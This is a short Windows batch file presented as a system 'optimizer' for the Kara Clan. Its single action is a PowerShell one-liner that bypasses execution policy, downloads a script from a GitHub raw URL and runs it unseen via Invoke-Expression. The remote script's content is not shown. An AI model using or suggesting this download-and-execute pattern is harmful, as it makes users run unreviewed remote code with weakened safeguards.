@echo off
title Kara Clan - Optimizer Vol.3
echo Kara Clan Optimizer Vol.3 — Complete
echo.
echo Downloading and running...
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { $s = Invoke-RestMethod 'https://raw.githubusercontent.com/TkPAIN/kara-clan-official-web/main/OptimizarWindows_v3.ps1'; Invoke-Expression $s }"
pause
